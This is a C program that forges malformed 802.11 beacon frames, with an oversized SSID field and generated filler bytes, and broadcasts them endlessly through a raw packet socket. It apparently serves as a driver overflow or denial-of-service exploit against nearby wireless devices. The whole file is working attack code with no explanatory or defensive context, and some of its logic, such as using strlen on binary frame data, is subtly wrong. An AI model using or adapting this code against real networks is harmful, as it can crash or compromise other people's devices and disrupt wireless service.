#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <asm/types.h>
#include <linux/if.h>
#include <linux/if_packet.h>
#include <linux/if_ether.h>
#include <linux/if_arp.h>
#include <netinet/in.h>
#include <stdlib.h>
#include <string.h>
#include <stdio.h>
#include <linux/wireless.h>

// Change BSSID and SRC MAC ADDR to AP you are associated

char beacon[] = { 0x80, 0x00, 0x00, 0x00, 0xff, 0xff, 0xff, 0xff, 0xff,
0xff,
0x00, 0x18, 0x39, 0xe2, 0x12, 0xda,0x00, 0x18, 0x39, 0xe2, 0x12, 0xda,
0x30, 0x2f, 0x84, 0x18, 0xa9, 0xf7, 0x00, 0x00, 0x00, 0x00, 0x64, 0x00,
0x01, 0x04, 0x00, 0xff, 0x53, 0x41, 0x55, 0x4e, 0x41, 0x01, 0x08, 0x82,
0x84, 0x8b,0x96, 0x24, 0x30, 0x48, 0x6c, 0x04, 0x01, 0x08, 0x05, 0x04,
0x00, 0x01, 0x00, 0x00, 0x2a, 0x01,0x04, 0x2f, 0x01, 0x04, 0x32, 0x04,
0x0c, 0x12, 0x18, 0x60, 0xdd, 0x06, 0x00, 0x10, 0x18, 0x02,0x00, 0xf4,
0x08, 0xc1, 0xca, 0x93 };

int main() {
    struct sockaddr_ll link;
    struct ifreq iface;
    int s, i, randd = 0x22, j, m, a, b;
    unsigned  long len = 0, c = 0;
    char s_1[700+sizeof(beacon)];

    if((s=socket(PF_INET, SOCK_DGRAM, 0))<0)
        return 0;

    bzero(&iface,sizeof(iface));
    bzero(&link,sizeof(link));
        bzero(s_1,sizeof(beacon));

    strcpy(iface.ifr_name,"ath0raw");


    if(ioctl(s,SIOCGIFHWADDR, &iface)) {
        return 0;
    }

    if(ioctl(s,SIOCGIFINDEX, &iface)) {
        return -1;
    }

    if((s=socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ALL)))<0) {
        return -1;
    }

    link.sll_family = AF_PACKET;
    link.sll_ifindex = iface.ifr_ifindex;

    if(bind(s,(struct sockaddr *) &link, sizeof(link))<0) {
        return -1;

    }


           memcpy(s_1,beacon,sizeof(beacon));

    randd = 0x44;

    for(i=0;i<33;i++)
    s_1[37+i] = 0x44;

    for(;;)    {

            i = 147;
                for(j=0;j<i;j++)    {
                    if(randd == 0xff)
                    randd = 0x00;
                    s_1[70+j] = randd++;
            }
            randd = 0x44;
            for(m=0;m<5;m++)    {
            len = sendto(s,s_1,strlen(beacon)+j, 0, NULL, 0);
            printf("Sent %d\n",len);
            }
    }

    close(s);

    return 0;
}

